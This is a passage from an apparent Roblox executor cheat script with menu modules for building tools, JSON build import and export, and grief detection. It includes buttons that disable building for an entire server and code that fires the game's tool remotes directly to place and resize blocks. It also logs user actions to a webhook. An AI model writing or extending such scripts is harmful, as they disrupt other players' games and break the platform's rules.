                end)
                task.wait(resizewait)
            until args[4] == nil or (args[4] == "decrease" and childcube and childcube.Size.Y <= 1) or (childcube and childcube.Size.Y == bsizev3.Y) or stopped == true or skipblock == true or not childcube or not childcube.Parent or c > (bsizev3.Y*3)/resizewait
        end
        args[2] = Enum.NormalId.Back
        c = 0
        if childcube and childcube.Size.Z ~= bsizev3.Z then
            repeat
                c = c + 1
                pos = (childcube and childcube.Position + childcube.Size/2) or pos
                args[4] = nil
                if childcube then
                    args[3] = pos
                    if childcube.Size.Z > bsizev3.Z then
                        args[4] = "decrease"
                    elseif childcube.Size.Z < bsizev3.Z then
                        args[4] = "increase"
                    end
                end
                if not game.Players.LocalPlayer.Character:FindFirstChild("Shape") and game.Players.LocalPlayer.Backpack:FindFirstChild("Shape") then
                    game.Players.LocalPlayer.Backpack.Shape.Parent = game.Players.LocalPlayer.Character
                end
                if game.Players.LocalPlayer.Character:FindFirstChild("Shape") then
                    event = (game.Players.LocalPlayer.Character.Shape:FindFirstChild("origevent") and game.Players.LocalPlayer.Character.Shape.origevent:Invoke(unpack(args))) or game.Players.LocalPlayer.Character.Shape.Script.Event:FireServer(unpack(args))
                end
                s,e = pcall(function()
                    if tp then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(0,6,0))
                    end
                end)
                task.wait(resizewait)
            until args[4] == nil or (args[4] == "decrease" and childcube and childcube.Size.Z <= 1) or (childcube and childcube.Size.Z == bsizev3.Z) or stopped == true or skipblock == true or not childcube or not childcube.Parent or c > (bsizev3.Z*3)/resizewait
        end
    end
    skipblock = false
    end)
    if oldprt then
        oldprt:Destroy()
    end
    childcube = nil
end

end -- /══ Tool Utility ══

do -- ══ Server Building ══
local BuildServerGroup = Tabs.Build:CreateModule({Name = 'Server Building'})

if getgenv().brickcollection == nil then
    getgenv().brickcollection = {}
end

 function dbc(b)
    if not b:IsA("BasePart") or b.Name ~= brickname then
        return
    end
    if not table.find(getgenv().brickcollection, b) then
        table.insert(getgenv().brickcollection, 1, b)
    end
end

trackScriptConnection(cfolder.DescendantAdded:Connect(dbc))
trackScriptConnection(cfolder.DescendantRemoving:Connect(function(b)
    if b:IsA("BasePart") and b.Name == brickname then
        local idx = table.find(getgenv().brickcollection, b)
        if idx then table.remove(getgenv().brickcollection, idx) end
    end
end))
for i, v in pairs(cfolder:GetDescendants()) do
    dbc(v)
end

BuildServerGroup:CreateButton({
    Name = 'Disable Building',
    Function = function()
        ExecuteDelete(block)
                sendActionWebhook("Disable Building", "User used Disable Building for a server")
        Library:Notify("Disabled building sucessfully!", 3)
    end
})

BuildServerGroup:CreateButton({
    Name = 'Disable Building (OG SERVERS)',
    Function = function()
        ExecuteDeleteOG(block)
        sendActionWebhook("Disable Building (OG)", "User used Disable Building for Original Servers")
        Library:Notify("Disabled building sucessfully!", 3)
    end
})

local _permDeleteSoundConn = nil
local DisableDeleteSoundButton = BuildServerGroup:CreateButton({
    Name = 'Disable Delete Sound',
    Function = _requirePremium(function()

        for _, desc in ipairs(cfolder:GetDescendants()) do
            if desc:IsA("Sound") then
                desc.Volume = 0
            end
        end

        if _permDeleteSoundConn then
            _permDeleteSoundConn:Disconnect()
        end
        _permDeleteSoundConn = cfolder.DescendantAdded:Connect(function(desc)
            if desc:IsA("Sound") then
                desc.Volume = 0
            end
        end)
        Library:Notify("Delete sounds permanently disabled", 3)
    end)
})

function doRestoreBuilding(delay)
    -- ensure placeholder brick exists for the build remote
    if not game.ReplicatedStorage:FindFirstChild(brickname) then
        local brick = Instance.new("Part")
        brick.Name = brickname
        brick.Parent = game.ReplicatedStorage
    end

    -- refresh tool scripts before we try to build
    for _, v in pairs(localplr.Character:GetChildren()) do
        if v:HasTag("The Chosen One by TomazDev") then
            v.Script.Enabled = false
            v.Script.Enabled = true
        end
    end
    for _, v in pairs(localplr.Backpack:GetChildren()) do
        if v:HasTag("The Chosen One by TomazDev") then
            v.Script.Enabled = false
            v.Script.Enabled = true
        end
    end
    if isog then
        pcall(function() localplr.Backpack.BTools.Enabled = false; localplr.Backpack.BTools.Enabled = true end)
    end

    local et = equiptool("Build")
    if not et then
        Library:Notify("Build tool not found!", 3)
        return false
    end

    task.wait(delay or 0)

    -- build ordered candidate list: real blocks at front, Debris/brickname at back
    local currbc = {}
    local ins = 1
    for i, v in pairs(getgenv().brickcollection) do
        if v ~= nil then
            if v:GetFullName() ~= brickname and v.Name ~= "Debris" then
                table.insert(currbc, 1, v)
                ins = ins + 1
            else
                if i % 2 == 1 then
                    table.insert(currbc, v)
                else
                    table.insert(currbc, ins, v)
                end
            end
        else
            table.remove(getgenv().brickcollection, table.find(getgenv().brickcollection, v))
        end
    end

    local block = nil
    local beforeamt = #cfolder[localplr.Name]:GetChildren()

    for i, v in pairs(currbc) do
        if v ~= nil and typeof(v) == "Instance" then
            et = equiptool("Build")
            if not et then
                Library:Notify("Build tool not found. Retry when it comes back.", 5)
                break
            end

            block = v
            if isog then
                pcall(function()
                    localplr.Backpack.Events:FireServer(
                        getplrpos(),
                        Enum.NormalId.Top,
                        block,
                        Color3.new(0, 0, 0),
                        "Smooth"
                    )
                end)
            else
                et.Script.Event:FireServer(
                    block,
                    Enum.NormalId.Top,
                    getplrpos(),
                    "detailed"
                )
            end

            task.wait(delay or 0)

            if beforeamt < #cfolder[localplr.Name]:GetChildren() then
                break
            end
        else
            table.remove(currbc, table.find(currbc, v))
        end
    end

    task.wait(1)
    block = cfolder[localplr.Name]:FindFirstChildWhichIsA("BasePart")
    if not block then
        return false
    end

    -- auto-resize the restored block to correct grid alignment using Shape tool
    local stool = localplr.Character:FindFirstChild("Shape") or localplr.Backpack:FindFirstChild("Shape")
    if stool and block.Size ~= Vector3.new(gridSize, gridSize, gridSize) then
        if stool.Parent == localplr.Backpack then
            stool.Parent = localplr.Character
            stool = localplr.Character:FindFirstChild("Shape")
        end
        local targetSize = Vector3.new(gridSize, gridSize, gridSize)
        local shapeArgs = {block, Enum.NormalId.Right, getplrpos(), ""}
        local c = 0
        local function resizeDim(dim, normalId)
            if not block or not block.Parent then return end
            if block.Size[dim] == targetSize[dim] then return end
            shapeArgs[2] = normalId
            c = 0
            repeat
                c = c + 1
                shapeArgs[3] = getplrpos()
                shapeArgs[4] = block.Size[dim] > targetSize[dim] and "decrease" or "increase"
                if not stool then stool = localplr.Character:FindFirstChild("Shape") end
                if stool then
                    pcall(function()
                        local ev = stool:FindFirstChild("origevent")
                        if ev then ev:Invoke(table.unpack(shapeArgs))
                        else stool.Script.Event:FireServer(table.unpack(shapeArgs)) end
                    end)
                end
                task.wait(resizewait)
            until not block or not block.Parent
                or block.Size[dim] == targetSize[dim]
                or (shapeArgs[4] == "decrease" and block.Size[dim] <= 1)
                or c > (targetSize[dim] * 3) / resizewait
        end
        resizeDim("X", Enum.NormalId.Right)
        resizeDim("Y", Enum.NormalId.Top)
        resizeDim("Z", Enum.NormalId.Back)
    end

    sendActionWebhook("Restore Building", "User used Restore Building")
    Library:Notify("Building restored successfully!", 3)
    return true
end

BuildServerGroup:CreateButton({
    Name = 'Restore Building',
    Function = function()
        Library:Notify("Restoring (fast)...", 3)
        local ok = doRestoreBuilding(0)
        if not ok then
            Library:Notify("Fast restore failed — trying slow method...", 4)
            local ok2 = doRestoreBuilding(0.15)
            if not ok2 then
                Library:Notify("Failed to restore. Run script before everything is delcubed.", 5)
            end
        end
    end
})

-- Preview build state
local previewParts = {}
local previewOrigPositions = {}
local previewBoxes = {}
previewOffset = Vector3.zero
previewRotation = CFrame.identity
previewBuildCenter = Vector3.zero
local previewModel = nil
local previewHandles = nil
local previewArcHandles = nil
previewActive = false

clearPreview = function()
    previewActive = false
    for _, p in ipairs(previewParts) do
        if p and p.Parent then p:Destroy() end
    end
    for _, b in ipairs(previewBoxes) do
        if b and b.Parent then b:Destroy() end
    end
    previewParts = {}
    previewOrigPositions = {}
    previewBoxes = {}
    previewOffset = Vector3.zero
    previewRotation = CFrame.identity
    if previewModel and previewModel.Parent then previewModel:Destroy() end
    previewModel = nil
    if previewHandles and previewHandles.Parent then previewHandles:Destroy() end
    previewHandles = nil
    if previewArcHandles and previewArcHandles.Parent then previewArcHandles:Destroy() end
    previewArcHandles = nil
    pcall(function()
        if _previewToggleBtn then _previewToggleBtn:SetText('Preview') end
    end)
end

local function applyPreviewTransform()
    for i, part in ipairs(previewParts) do
        if part and part.Parent then
            local relPos = previewOrigPositions[i] - previewBuildCenter
            local rotatedRelPos = previewRotation * relPos
            local newPos = previewBuildCenter + rotatedRelPos + previewOffset
            part.CFrame = CFrame.new(newPos) * previewRotation
        end
    end
    if previewModel and previewModel.PrimaryPart then
        previewModel.PrimaryPart.CFrame = CFrame.new(previewBuildCenter + previewOffset) * previewRotation
    end
end

local function movePreview(newOffset)
    previewOffset = newOffset
    applyPreviewTransform()
end

startPreview = function(buildData)
    clearPreview()

    local _px, _py, _pz = {}, {}, {}
    for _, v in ipairs(buildData) do
        local posses = v.p or v.pos
        if not posses then continue end
        local bsz = v.s or v.size
        table.insert(_px, posses[1] + (bsz and (bsz[1]/2 - 0.5) or (gridSize/2 - 0.5)))
        table.insert(_py, posses[2] + (bsz and (bsz[2]/2 - 0.5) or (gridSize/2 - 0.5)))
        table.insert(_pz, posses[3] + (bsz and (bsz[3]/2 - 0.5) or (gridSize/2 - 0.5)))
    end
    table.sort(_px); table.sort(_py); table.sort(_pz)
    local _mid = math.ceil(#_px / 2)
    previewBuildCenter = Vector3.new(_px[_mid] or 0, _py[_mid] or 0, _pz[_mid] or 0)

    previewModel = Instance.new("Model")
    previewModel.Name = "BuildPreview"
    local primaryPart = Instance.new("Part")
    primaryPart.Size = Vector3.new(1, 1, 1)
    primaryPart.Transparency = 1
    primaryPart.Anchored = true
    primaryPart.CanCollide = false
    primaryPart.CanQuery = false
    primaryPart.CastShadow = false
    primaryPart.CFrame = CFrame.new(previewBuildCenter)
    primaryPart.Parent = previewModel
    previewModel.PrimaryPart = primaryPart
    previewModel.Parent = workspace

    for _, v in ipairs(buildData) do
        local posses = v.p or v.pos
        if not posses then continue end
        local bsz = (v.s or v.size) and Vector3.new(table.unpack(v.s or v.size)) or nil
        local partSize = bsz or Vector3.new(gridSize, gridSize, gridSize)
        local actualPos = Vector3.new(
            posses[1] + partSize.X/2 - 0.5,
            posses[2] + partSize.Y/2 - 0.5,
            posses[3] + partSize.Z/2 - 0.5
        )
        local blockColor = (v.c or v.color) and Color3.fromRGB(table.unpack(v.c or v.color)) or Color3.fromRGB(192, 192, 192)
        local blockMat = swappedmaterials[v.m or v.mat] or Enum.Material.SmoothPlastic
        local p = Instance.new("Part")
        p.Anchored = true
        p.CanCollide = false
        p.CanQuery = false
        p.CastShadow = false
        p.Color = blockColor
        p.Material = blockMat
        p.Transparency = 0
        p.Size = partSize
        p.CFrame = CFrame.new(actualPos)
        local sprays = v.sp or v.sprayed
        if sprays then
            for _, sv in pairs(sprays) do
                local face = Enum.NormalId[sv[1]]
                local img = sv[2]
                local txt = sv[3]
                local sui = Instance.new("SurfaceGui")
                sui.Face = face
                sui.SizingMode = Enum.SurfaceGuiSizingMode.PixelsPerStud
                sui.PixelsPerStud = 50
                local _o, _c = string.gsub(txt, "#", "l")
                if _c == string.len(txt) then
                    local il = Instance.new("ImageLabel")
                    il.Image = img
                    il.BackgroundTransparency = 1
                    il.Size = UDim2.new(1, 0, 1, 0)
                    il.Parent = sui
                else
                    local tl = Instance.new("TextLabel")
                    tl.Text = txt
                    tl.BackgroundTransparency = 1
                    tl.TextScaled = true
                    tl.TextColor3 = Color3.fromRGB(255, 255, 255)
                    tl.Font = Enum.Font.FredokaOne
                    tl.Size = UDim2.new(1, 0, 1, 0)
                    tl.Parent = sui
                end
                sui.Parent = p
            end
        end
        p.Parent = workspace

        local sb = Instance.new("SelectionBox")
        sb.Adornee = p
        sb.Color3 = Color3.fromRGB(255, 255, 255)
        sb.LineThickness = 0.015
        sb.SurfaceTransparency = 1
        sb.Parent = workspace
        table.insert(previewBoxes, sb)

        table.insert(previewParts, p)
        table.insert(previewOrigPositions, actualPos)
    end

    previewHandles = Instance.new("Handles")
    previewHandles.Adornee = primaryPart
    previewHandles.Style = Enum.HandlesStyle.Movement
    previewHandles.Color3 = Color3.fromRGB(255, 220, 0)
    previewHandles.Parent = CoreGui

    local dragStartOffset = Vector3.zero
    previewHandles.MouseButton1Down:Connect(function(face)
        dragStartOffset = previewOffset
    end)
    previewHandles.MouseDrag:Connect(function(face, distance)
        local snapped = math.round(distance / gridSize) * gridSize
        local faceVec = Vector3.fromNormalId(face)
        movePreview(dragStartOffset + faceVec * snapped)
    end)

    previewArcHandles = Instance.new("ArcHandles")
    previewArcHandles.Adornee = primaryPart
    previewArcHandles.Axes = Axes.new(Enum.Axis.X, Enum.Axis.Y, Enum.Axis.Z)
    previewArcHandles.Color3 = Color3.fromRGB(100, 200, 255)
    previewArcHandles.Parent = CoreGui

    local arcSnapAngle = math.pi / 12  -- 15° increments
    local arcStartRot = CFrame.identity
    previewArcHandles.MouseButton1Down:Connect(function()
        arcStartRot = previewRotation
    end)
    previewArcHandles.MouseDrag:Connect(function(axis, relativeAngle)
        local snapped = math.round(relativeAngle / arcSnapAngle) * arcSnapAngle
        local newRot
        if axis == Enum.Axis.X then
            newRot = arcStartRot * CFrame.Angles(snapped, 0, 0)
        elseif axis == Enum.Axis.Y then
            newRot = arcStartRot * CFrame.Angles(0, snapped, 0)
        else
            newRot = arcStartRot * CFrame.Angles(0, 0, snapped)
        end
        previewRotation = newRot
        applyPreviewTransform()
    end)

    previewActive = true
    Library:Notify("Preview active — drag arrows to move, arc handles to rotate, then click Load Buildings.", 6)
end

end -- /══ Server Building ══

-- Cleans up common JSON paste artifacts so decode works reliably
local function _sanitizeImportJson(str)
    if not str or str == "" then return str end
    -- Strip UTF-8 BOM
    str = str:gsub("^\xEF\xBB\xBF", "")
    -- Mobile: strip non-breaking spaces, zero-width chars, smart quotes
    str = str:gsub("\xC2\xA0", " ")           -- U+00A0 non-breaking space
    str = str:gsub("\xE2\x80\x8B", "")        -- U+200B zero-width space
    str = str:gsub("\xE2\x80\x8C", "")        -- U+200C zero-width non-joiner
    str = str:gsub("\xE2\x80\x8D", "")        -- U+200D zero-width joiner
    str = str:gsub("\xE2\x80[\x9C\x9D]", '"') -- U+201C/201D smart double quotes
    str = str:gsub("\xE2\x80[\x98\x99]", "'") -- U+2018/2019 smart single quotes
    -- Normalize line endings to spaces
    str = str:gsub("\r\n", " "):gsub("\r", " "):gsub("\n", " ")
    -- Trim
    str = str:match("^%s*(.-)%s*$")
    if str == "" then return str end
    -- Remove trailing commas before ] or } — e.g. [{...},] -> [{...}]
    repeat
        local newStr = str:gsub(",%s*([%]%}])", "%1")
        if newStr == str then break end
        str = newStr
    until false
    -- Wrap bare single objects in array brackets
    if str:sub(1,1) == "{" and str:sub(-1) == "}" then
        str = "[" .. str .. "]"
    end
    return str
end

-- Decodes JSON with precise error diagnostics. Returns (data, nil) or (nil, errMsg).
local function _decodeJson(raw)
    if not raw or raw == "" then
        return nil, "Input is empty — paste JSON first"
    end
    local rawLen = #raw
    local firstChar = raw:sub(1,1)
    local lastChar  = raw:sub(-1)
    local jsonStr = _sanitizeImportJson(raw)
    if not jsonStr or jsonStr == "" then
        return nil, string.format("Nothing left after sanitize (raw len=%d)", rawLen)
    end
    local ok, result = pcall(function() return http:JSONDecode(jsonStr) end)
    if not ok then
        local err = tostring(result)
        -- Extract the position hint from Lua JSON errors e.g. "... :1: Expected value"
        local hint = err:match(":%d+: (.+)$") or err:sub(1, 80)
        -- Truncation suspect: if last char isn't ] or } the JSON was likely cut off
        local truncNote = (lastChar ~= "]" and lastChar ~= "}") and
            string.format(" | last char='%s' — may be truncated", lastChar) or ""
        return nil, string.format("Parse error: %s (len=%d, first='%s')%s", hint, rawLen, firstChar, truncNote)
    end
    if type(result) ~= "table" then
        return nil, string.format("Expected array/object, got %s (len=%d)", type(result), rawLen)
    end
    if #result == 0 then
        return nil, string.format("JSON is valid but has 0 blocks (len=%d, type=%s)", rawLen, type(result))
    end
    return result, nil
end

do -- ══ Import Build ══
local BuildImportGroup = Tabs.Build:CreateModule({Name = 'Import Build'})

importJsonInput = BuildImportGroup:CreateTextBox({
    Default     = '',
    Name = 'Paste JSON here:',
    PlaceholderText = 'Ctrl+V / use Paste button below',
    Tooltip     = 'JSON from Copy Server/My Build'
})

BuildImportGroup:CreateButton({
    Name = 'Load Buildings',
    Function = function()
        local buildData, err = _decodeJson(importJsonInput.Value)
        if err then
            Library:Notify(err, 7); return
        end
        Library:Notify("Loading " .. #buildData .. " blocks from JSON…", 5)
        local appliedOffset = previewOffset
        local appliedRotation = previewRotation
        local appliedCenter = previewBuildCenter
        clearPreview()
        stopped = false
        totalBuildBlocks  = #buildData
        currentBlockIndex = 0
        _buildStartTime = tick()
        updateBuildProgress()
        buildData = sortBlocksByDistanceFromSpawn(buildData)
        task.spawn(function()
            for i, v in ipairs(buildData) do
                if stopped then break end
                currentBlockIndex = i
                updateBuildProgress()
                local posses = v.p or v.pos
                if not posses then continue end
                local bsz  = (v.s or v.size) and Vector3.new(table.unpack(v.s or v.size)) or Vector3.new(gridSize, gridSize, gridSize)
                local halfOff = Vector3.new(bsz.X/2 - 0.5, bsz.Y/2 - 0.5, bsz.Z/2 - 0.5)
                local rawPos = Vector3.new(posses[1], posses[2], posses[3])
                local origCenter = rawPos + halfOff
                local relPos = origCenter - appliedCenter
                local rotatedRelPos = appliedRotation * relPos
                local newCenter = appliedCenter + rotatedRelPos + appliedOffset
                local pos = newCenter - halfOff
                local col  = (v.c or v.color) and Color3.fromRGB(table.unpack(v.c or v.color)) or Color3.fromRGB(192,192,192)
                local mat  = v.m or v.mat
                createpartrepl(pos, bsz, col, swappedmaterials[mat] or Enum.Material.SmoothPlastic)
                buildblock(pos, mat, col, nil, bsz, true, v.o or v.origmat, v.sp or v.sprayed, v.a or v.anchored, v.cc or v.collide)
            end
            stopped = false
            totalBuildBlocks  = 0
            currentBlockIndex = 0
            updateBuildProgress()
            Library:Notify("JSON build loaded!", 5)
        end)
    end
})

BuildImportGroup:CreateButton({
    Name = 'Stop Building',
    Function = function()
        stopped = true
        Library:Notify("Build stopped!", 3)
    end
})

local _previewToggleBtn
_previewToggleBtn = BuildImportGroup:CreateButton({
    Name = 'Preview',
    Function = _requirePremium(function()
        if previewActive then
            clearPreview()
            _previewToggleBtn:SetText('Preview')
            Library:Notify("Preview cancelled.", 3)
        else
            local buildData, err = _decodeJson(importJsonInput.Value)
            if err then
                Library:Notify(err, 7); return
            end
            Library:Notify("Generating preview for " .. #buildData .. " blocks...", 3)
            task.spawn(function()
                startPreview(buildData)
                _previewToggleBtn:SetText('Cancel')
            end)
        end
    end)
})
registerPremiumButtonLock(_previewToggleBtn, function()
    return previewActive and 'Cancel' or 'Preview'
end, {
    subtitleText = 'Premium preview',
    helperText = 'Tap for premium',
})

buildFiles = getfn()
end -- /══ Import Build ══

do -- ══ Export Build ══
local BuildExportGroup = Tabs.Build:CreateModule({Name = 'Export Build'})

SavedBuildDropdown = BuildExportGroup:CreateDropdown({
    List = buildFiles or {},
    Default = 1,
    Name = 'Saved Builds:',
    Tooltip = 'Select a build to load or delete'
})

BuildExportGroup:CreateButton({
    Name = 'Save Buildings',
    Function = function()
        local data = {}
        for _, v in pairs(cfolder:GetDescendants()) do
            if v:IsA("BasePart") then table.insert(data, saveblock(v)) end
        end
        if #data == 0 then Library:Notify("No blocks on server!", 3); return end
        if setclipboard then
            setclipboard(http:JSONEncode(data))
            Library:Notify("Copied " .. #data .. " server blocks to clipboard!", 5)
        else
            Library:Notify("Clipboard unavailable on this executor", 3)
        end
    end
})

BuildExportGroup:CreateButton({
    Name = 'Save to File',
    Function = function()
        local data = {}
        for _, v in pairs(cfolder:GetDescendants()) do
            if v:IsA("BasePart") then table.insert(data, saveblock(v)) end
        end
        if #data == 0 then Library:Notify("No blocks on server!", 3); return end
        pcall(makefolder, "TheChosenOneBuilds")
        local name = "Build_" .. os.date("%Y%m%d_%H%M%S")
        writefile("TheChosenOneBuilds/" .. name .. ".json", http:JSONEncode(data))
        updatedropdown()
        Library:Notify("Saved " .. #data .. " blocks as '" .. name .. "'", 5)
    end
})

BuildExportGroup:CreateButton({
    Name = 'Load from File',
    Function = function()
        if not SavedBuildDropdown or SavedBuildDropdown.Value == "" then
            Library:Notify("Select a saved build first", 3); return
        end
        local path = "TheChosenOneBuilds/" .. SavedBuildDropdown.Value .. ".json"
        local ok, content = pcall(readfile, path)
        if not ok or not content or content == "" then
            Library:Notify("Failed to read file", 5); return
        end
        local testData, err = _decodeJson(content)
        if err then
            Library:Notify(err, 7); return
        end
        importJsonInput:SetValue(content)
        Library:Notify("Loaded " .. #testData .. " blocks into Import tab", 5)
    end
})

files = listfilesfixed("")
if not files then files = {} end

pcall(function()
    if not table.find(files,"TheChosenOneBuilds/") and not table.find(files,"TheChosenOneBuilds") then
        makefolder("TheChosenOneBuilds")
    end
end)

end -- /══ Export Build ══

do -- ══ Auto-Build Fixer ══

-- Authorized user IDs — defaults to OWNER_ID. Add extras via the UI.
local ABF_AUTHORIZED = {}
for _, _id in ipairs(OWNER_ID) do ABF_AUTHORIZED[_id] = true end

if ABF_AUTHORIZED[plr.UserId] then

local ABF_THRESHOLD = 5    -- deletions in window to trigger alert/fix
local ABF_WINDOW    = 2    -- rolling detection window in seconds
local ABF_MIN_TIME  = 60   -- minimum victim leaderstat Time to act on
local ABF_AUTO_FIX  = true -- restore blocks automatically on detection

local _abfActive       = false
local _abfDetectConn   = nil
local _abfAddConn      = nil
local _abfEvalThread   = nil
local _abfQueue        = {}    -- {time, ownerName, blockData, pos}
local _activeAlert     = nil   -- handle returned by Library:CreateAlert (nil = no alert shown)
local _abfStatusLabel  = nil
local _abfCountLabel   = nil
local _abfLastLabel    = nil
-- Pre-cached ownership: [brick_instance] = ownerName
-- b.Parent is nil by the time DescendantRemoving fires in Lua,
-- so ownership must be recorded at placement time via DescendantAdded.
local _blockOwnerCache = {}

-- ── helpers ──────────────────────────────────────────────────────────────

local function _abfGetPlayerTime(name)
    local p = Players:FindFirstChild(name)
    if not p then return 0 end
    local ls = p:FindFirstChild("leaderstats")
    if not ls then return 0 end
    local tv = ls:FindFirstChild("Time")
    return tv and tv.Value or 0
end

local function _abfGetMedianTime()
    local times = {}
    for _, p in ipairs(Players:GetPlayers()) do
        local ls = p:FindFirstChild("leaderstats")
        if ls then
            local tv = ls:FindFirstChild("Time")
            if tv then table.insert(times, tv.Value) end
        end
    end
    if #times == 0 then return 0 end
    table.sort(times)
    return times[math.ceil(#times / 2)]
end

local function _abfBlockPriority(bd)
    if bd.sp and #bd.sp > 0 then
        for _, spray in ipairs(bd.sp) do
            if spray[3] and spray[3] ~= "" then return 3 end
        end
        return 2
    end
    if bd.m and bd.m ~= "" then return 1 end
    return 0
end

-- Closest non-victim player to the grief center
local function _abfFindGriefer(centerPos, victimName)
    local minDist, griefer = math.huge, nil
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name == victimName or p == plr then continue end
        local char = p.Character
        if not char then continue end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then
            local d = (hrp.Position - centerPos).Magnitude
            if d < minDist then minDist = d; griefer = p end
        end
    end
    return griefer, minDist
end

-- ── restore ───────────────────────────────────────────────────────────────

local function _abfRestore(blocks, victimName)
    if not blocks or #blocks == 0 then return end
    Library:Notify("Auto-fixing " .. #blocks .. " blocks for " .. victimName, 5)
    pcall(sendActionWebhook, "Auto-Build Fixer",
        "Restoring " .. #blocks .. " blocks for " .. victimName)
    table.sort(blocks, function(a, b) return _abfBlockPriority(a) > _abfBlockPriority(b) end)
    task.spawn(function()
        -- refresh tool scripts before building (mirrors doRestoreBuilding)
        pcall(function()
            for _, v in pairs(localplr.Character:GetChildren()) do
                if v:HasTag("The Chosen One by TomazDev") then
                    v.Script.Enabled = false; v.Script.Enabled = true
                end
            end
            for _, v in pairs(localplr.Backpack:GetChildren()) do
                if v:HasTag("The Chosen One by TomazDev") then
                    v.Script.Enabled = false; v.Script.Enabled = true
                end
            end
        end)
        for _, bd in ipairs(blocks) do
            if not _abfActive then break end
            if not bd.p then continue end
            local pos = Vector3.new(bd.p[1], bd.p[2], bd.p[3])
            local col = bd.c and Color3.fromRGB(table.unpack(bd.c)) or Color3.fromRGB(192,192,192)
            local bsz = bd.s and Vector3.new(table.unpack(bd.s)) or nil
            local mat = bd.m
            pcall(function()
                createpartrepl(pos, bsz, col, swappedmaterials[mat] or Enum.Material.SmoothPlastic)
                buildblock(pos, mat, col, nil, bsz, true, bd.o, bd.sp, bd.a, bd.cc)
            end)
        end
        if _abfActive and _abfStatusLabel then _abfStatusLabel:SetText("Status: Scanning...") end
        Library:Notify("Auto-fix done for " .. victimName, 3)
    end)
end

-- ── grief alert (via PealzwareUI) ─────────────────────────────────────────
-- Library:CreateAlert handles all GUI — no custom ScreenGui needed here.

local _alertVictim  = ""
local _alertGriefer = ""
local _alertBlocks  = {}

local function _hideAlert()
    if _activeAlert then
        _activeAlert.Dismiss()
        _activeAlert = nil
    end
    -- Process next queued alert after a short delay
    task.defer(function()
        if not _activeAlert and _alertQueue and #_alertQueue > 0 then
            local a = table.remove(_alertQueue, 1)
            _showAlert(a.victimName, a.grieferName, a.blockCount, a.blocks, a.victimTime, a.medianTime)
            if ABF_AUTO_FIX then _abfRestore(a.restoreBlocks, a.victimName) end
        end
    end)
end

local function _showAlert(victimName, grieferName, blockCount, blocks, victimTime, medianTime)
    _hideAlert()
    _alertVictim = victimName; _alertGriefer = grieferName; _alertBlocks = blocks

    if _abfLastLabel then
        _abfLastLabel:SetText("Last: " .. victimName ..
            (grieferName ~= "" and " (by " .. grieferName .. ")" or "") ..
            " — " .. blockCount .. " blks")
    end

    _activeAlert = Library:CreateAlert({
        Title  = "Grief Detected!",
        Text   = string.format(
            "Victim: %s  (time: %ds)\nSuspect: %s",
            victimName, math.floor(victimTime),
            grieferName ~= "" and grieferName or "Unknown"),
        Detail = string.format(
            "%d block%s deleted in %ds  |  server median: %ds",
            blockCount, blockCount ~= 1 and "s" or "", ABF_WINDOW, math.floor(medianTime)),
        Buttons = {
            {
                Text  = "Auto-Fix",
                Color = Color3.fromRGB(30, 148, 75),
                Func  = function()
                    local b, v = _alertBlocks, _alertVictim
                    _alertBlocks = {}
                    _abfRestore(b, v)
                end,
            },
            {
                -- Uses TCO admin command system (; prefix, Chosen team only)
                Text  = "Reset Griefer",
                Color = Color3.fromRGB(180, 85, 18),
                Func  = function()
                    local target = _alertGriefer ~= "" and _alertGriefer or _alertVictim
                    sendGeneralChatMessage(";reset " .. target)
                    Library:Notify("Reset " .. target, 3)
                end,
            },
            {
                Text  = "Ignore",
                Color = Library.OutlineColor,
                Func  = function() end,
            },
        },
    })
end

-- ── scan / eval loop ──────────────────────────────────────────────────────

local _alertQueue = {}  -- queued alerts: {victimName, grieferName, blockCount, blocks, victimTime, medianTime}

local function _abfProcessAlertQueue()
    if _activeAlert or #_alertQueue == 0 then return end
    local a = table.remove(_alertQueue, 1)
    _showAlert(a.victimName, a.grieferName, a.blockCount, a.blocks, a.victimTime, a.medianTime)
    if ABF_AUTO_FIX then _abfRestore(a.restoreBlocks, a.victimName) end
end

local function _abfEvaluate()
    while _abfActive do
        task.wait(0.3)
        local now = tick()

        local i = 1
        while i <= #_abfQueue do
            if now - _abfQueue[i].time > ABF_WINDOW + 4 then
                table.remove(_abfQueue, i)
            else i = i + 1 end
        end

        if _abfCountLabel then
            _abfCountLabel:SetText("Deletions tracked: " .. #_abfQueue)
        end

        -- Process any queued alerts when current alert is dismissed
        if not _activeAlert and #_alertQueue > 0 then
            _abfProcessAlertQueue()
        end

        local byOwner = {}
        for _, ev in ipairs(_abfQueue) do
            if now - ev.time <= ABF_WINDOW then
                byOwner[ev.ownerName] = byOwner[ev.ownerName] or {}
                table.insert(byOwner[ev.ownerName], ev)
            end
        end

        for ownerName, events in pairs(byOwner) do
            if #events < ABF_THRESHOLD then continue end

            local victimTime = _abfGetPlayerTime(ownerName)
            local medianTime = _abfGetMedianTime()
            local ratio      = medianTime > 0 and (victimTime / medianTime) or 0
            -- Only filter when we have real time data; 0 means leaderstat absent
            if victimTime > 0 and victimTime < ABF_MIN_TIME and ratio < 0.3 then continue end

            local toRestore, newQueue = {}, {}
            local sumX, sumY, sumZ, cnt = 0, 0, 0, 0
            for _, ev in ipairs(_abfQueue) do
                if ev.ownerName == ownerName then
                    table.insert(toRestore, ev.blockData)
                    if ev.pos then
                        sumX = sumX + ev.pos.X; sumY = sumY + ev.pos.Y
                        sumZ = sumZ + ev.pos.Z; cnt = cnt + 1
                    end
                else
                    table.insert(newQueue, ev)
                end
            end
            _abfQueue = newQueue

            local grieferName = ""
            if cnt > 0 then
                local center = Vector3.new(sumX/cnt, sumY/cnt, sumZ/cnt)
                local gp, gd = _abfFindGriefer(center, ownerName)
                if gp and gd < 60 then grieferName = gp.Name end
            end

            if _abfStatusLabel then
                _abfStatusLabel:SetText("Alert: " .. ownerName .. " (" .. #toRestore .. " blks)")
            end

            local alertData = {
                victimName = ownerName, grieferName = grieferName,
                blockCount = #toRestore,
                blocks = ABF_AUTO_FIX and {} or toRestore,
                restoreBlocks = toRestore,
                victimTime = victimTime, medianTime = medianTime,
            }

            if _activeAlert then
                -- Queue the alert instead of dropping it
                table.insert(_alertQueue, alertData)
            else
                _showAlert(ownerName, grieferName, #toRestore, ABF_AUTO_FIX and {} or toRestore, victimTime, medianTime)
                if ABF_AUTO_FIX then _abfRestore(toRestore, ownerName) end
            end
        end
    end
end

local function _abfStart()
